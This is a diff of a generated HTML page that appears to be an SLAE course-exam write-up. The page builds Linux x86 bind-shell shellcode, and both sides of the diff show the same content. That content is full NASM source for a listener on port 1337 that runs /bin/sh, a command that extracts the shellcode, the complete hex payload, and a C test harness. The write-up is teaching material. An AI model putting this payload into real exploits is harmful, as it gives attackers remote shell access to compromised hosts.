+</span></span><span class=line><span class=cl>    <span class=c1>; push //bin/sh onto the stack</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x68732f6e</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x69622f2f</span>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; Set address of esp to ebx, which points</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; to //bin/sh</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>      <span class=c1>; execv syscall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=final-code>Final code</h3><p>Now we should have something that looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
 </span><span class=lnt>  2
 </span><span class=lnt>  3
 </span><span class=lnt>  4
@@ -878,147 +686,135 @@ DESCRIPTION
 </span><span class=lnt>121
 </span><span class=lnt>122
 </span><span class=lnt>123
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=c1>;---------------------------------</span>
-<span class=c1>;</span>
-<span class=c1>; Author: @dubs3c</span>
-<span class=c1>; </span>
-<span class=c1>; Purpose:</span>
-<span class=c1>; Start a bind shell on port 1337</span>
-<span class=c1>; On connection, execute /bin/sh</span>
-<span class=c1>;</span>
-<span class=c1>;----------------------------------</span>
-
-<span class=k>global</span> <span class=nv>_start</span>
-
-<span class=k>section</span> <span class=nv>.text</span>
-<span class=nl>_start:</span>
-
-    <span class=c1>; zero out registers</span>
-    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
-    <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
-    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
-
-    <span class=c1>; -------------------------------------</span>
-    <span class=c1>; # Setup socket</span>
-    
-    <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; __NR_socketcall 102</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; SYS_SOCKET</span>
-
-    <span class=c1>; # Setup socket</span>
-    <span class=c1>; Resulting file descriptor is saved to eax</span>
-    <span class=nf>push</span> <span class=nb>edx</span>
-    <span class=nf>push</span> <span class=mh>0x1</span>
-    <span class=nf>push</span> <span class=mh>0x2</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Arguments are located top of the stack</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel it&#39;s time to boogie</span>
-    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax contains the file descriptor created by socket(), store it in $edi for now</span>
-
-    <span class=c1>; ---------------------------------</span>
-    <span class=c1>; # Setup bind</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; SYS_BIND </span>
-
-    <span class=c1>; setup sockaddr struct</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; Listen on 0.0.0.0</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
-    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Store the address that points to our struct</span>
-    
-    <span class=c1>; Push the arguments for bind()</span>
-    <span class=nf>push</span> <span class=mh>0x10</span>        <span class=c1>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)</span>
-    <span class=nf>push</span> <span class=nb>ecx</span>         <span class=c1>; Points to our sockaddr_in struct</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Contains our file descriptor</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second parameter for socketcall, points to arguments required by bind()</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel let&#39;s go!</span>
-    
-    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup listen</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x4</span>      <span class=c1>; SYS_LISTEN</span>
-
-    <span class=nf>push</span> <span class=mh>0x2</span>         <span class=c1>; backlog, hold 2 connections in queue</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_LISTEN</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Instruct the kernel to run our syscall</span>
-
-    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup accept</span>
-    <span class=c1>; socketcall</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x5</span>      <span class=c1>; SYS_ACCEPT</span>
-
-    <span class=c1>; Setup accept</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
-    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
-    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
-
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_ACCEPT</span>
-
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Execute</span>
-    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax stores the peer&#39;s file descriptor, save it to edi</span>
-
-    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup dup2</span>
-    <span class=c1>; redirect to stdin</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>     <span class=c1>; syscall number dup2 63 --&gt; 0x3f</span>
-    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>     <span class=c1>; peer&#39;s file descriptor</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>edx</span>     <span class=c1>; STDIN</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; redirect to stdout</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
-    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; STDOUT</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; redirect to stderr</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
-    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; STDERR</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; --------------------</span>
-    <span class=c1>; # Setup execv</span>
-    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
-    <span class=nf>push</span> <span class=nb>edx</span>
-    
-    <span class=c1>; push //bin/sh onto the stack</span>
-    <span class=nf>push</span> <span class=mh>0x68732f6e</span>
-    <span class=nf>push</span> <span class=mh>0x69622f2f</span>  
-
-    <span class=c1>; Set address of esp to ebx, which points</span>
-    <span class=c1>; to //bin/sh</span>
-    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
-    
-    <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
-    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>      <span class=c1>; execv syscall</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>
-
-    <span class=c1>; -----------------------------</span>
-    <span class=c1>; THE END - HAVE A NICE SHELL |</span>
-    <span class=c1>; -----------------------------</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>A screenshot of running the bind shell program can be seen below:</p>
-<p><img src=slae-bind-shell.png alt=image></p>
-<p>The program is runnong port <code>1337</code> as seen in the top-right pane, and can be connected to by running <code>nc localhost 1337</code>. Once connected, normal linux commands can be used.</p>
-<h3 id=extracting-shellcode>Extracting shellcode</h3>
-<p>If we need a bind shell in our exploit, we can easily extract the assembly instructions as &ldquo;shellcode&rdquo;, like so:</p>
-<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/assignment_1$ objdump -d ./assignment_1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed
-'s/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
-&quot;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=c1>;---------------------------------</span>
+</span></span><span class=line><span class=cl><span class=c1>;</span>
+</span></span><span class=line><span class=cl><span class=c1>; Author: @dubs3c</span>
+</span></span><span class=line><span class=cl><span class=c1>; </span>
+</span></span><span class=line><span class=cl><span class=c1>; Purpose:</span>
+</span></span><span class=line><span class=cl><span class=c1>; Start a bind shell on port 1337</span>
+</span></span><span class=line><span class=cl><span class=c1>; On connection, execute /bin/sh</span>
+</span></span><span class=line><span class=cl><span class=c1>;</span>
+</span></span><span class=line><span class=cl><span class=c1>;----------------------------------</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>global</span> <span class=nv>_start</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>section</span> <span class=nv>.text</span>
+</span></span><span class=line><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; zero out registers</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; -------------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup socket</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; __NR_socketcall 102</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; SYS_SOCKET</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup socket</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; Resulting file descriptor is saved to eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x1</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x2</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Arguments are located top of the stack</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel it&#39;s time to boogie</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax contains the file descriptor created by socket(), store it in $edi for now</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; ---------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup bind</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; SYS_BIND </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; setup sockaddr struct</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; Listen on 0.0.0.0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x3905</span> <span class=c1>; htons(1337)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2</span>    <span class=c1>; AF_INET</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Store the address that points to our struct</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; Push the arguments for bind()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x10</span>        <span class=c1>; Length of __SOCK_SIZE__ which is 16 (0x10 in hex)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>ecx</span>         <span class=c1>; Points to our sockaddr_in struct</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Contains our file descriptor</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second parameter for socketcall, points to arguments required by bind()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel let&#39;s go!</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup listen</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x4</span>      <span class=c1>; SYS_LISTEN</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x2</span>         <span class=c1>; backlog, hold 2 connections in queue</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_LISTEN</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Instruct the kernel to run our syscall</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup accept</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x5</span>      <span class=c1>; SYS_ACCEPT</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; Setup accept</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>         <span class=c1>; 0x0</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edi</span>         <span class=c1>; Our file descriptor</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Second argument to socketcall() which points to the arguments for SYS_ACCEPT</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Execute</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax stores the peer&#39;s file descriptor, save it to edi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup dup2</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stdin</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>     <span class=c1>; syscall number dup2 63 --&gt; 0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>edi</span>     <span class=c1>; peer&#39;s file descriptor</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>edx</span>     <span class=c1>; STDIN</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stdout</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; STDOUT</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; redirect to stderr</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x2</span>      <span class=c1>; STDERR</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; --------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup execv</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; push //bin/sh onto the stack</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x68732f6e</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x69622f2f</span>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; Set address of esp to ebx, which points</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; to //bin/sh</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>      <span class=c1>; execv syscall</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; -----------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; THE END - HAVE A NICE SHELL |</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; -----------------------------</span>
+</span></span></code></pre></td></tr></table></div></div><p>A screenshot of running the bind shell program can be seen below:</p><p><img src=slae-bind-shell.png alt=image></p><p>The program is runnong port <code>1337</code> as seen in the top-right pane, and can be connected to by running <code>nc localhost 1337</code>. Once connected, normal linux commands can be used.</p><h3 id=extracting-shellcode>Extracting shellcode</h3><p>If we need a bind shell in our exploit, we can easily extract the assembly instructions as &ldquo;shellcode&rdquo;, like so:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/assignment_1$ objdump -d ./assignment_1|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed
+&#39;s/ /\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&#34;/&#39;|sed &#39;s/$/&#34;/g&#39;
+&#34;\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe
 1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb
-0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&quot;
-</code></pre><p>To demonstrate, this C program will execute our shellcode and creating our bind shell:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80&#34;
+</code></pre><p>To demonstrate, this C program will execute our shellcode and creating our bind shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -1036,34 +832,25 @@ DESCRIPTION
 </span><span class=lnt>16
 </span><span class=lnt>17
 </span><span class=lnt>18
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span><span class=cpf>&lt;string.h&gt;</span><span class=cp>
-</span><span class=cp></span>
-<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span> \
-<span class=s>&#34;</span><span class=se>\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
-
-<span class=n>main</span><span class=p>()</span>
-<span class=p>{</span>
-       <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
-       <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
-       <span class=n>ret</span><span class=p>();</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Compile with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code>. Shellcode length is 110.</p>
-<h2 id=making-the-listening-port-configurable>Making the listening port configurable</h2>
-<p>Right now the port <code>1337</code> is hardcoded, let&rsquo;s make a wrapper script in python which allows for setting a custom port.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span> \
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68\x05\x39\x66\x6a</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
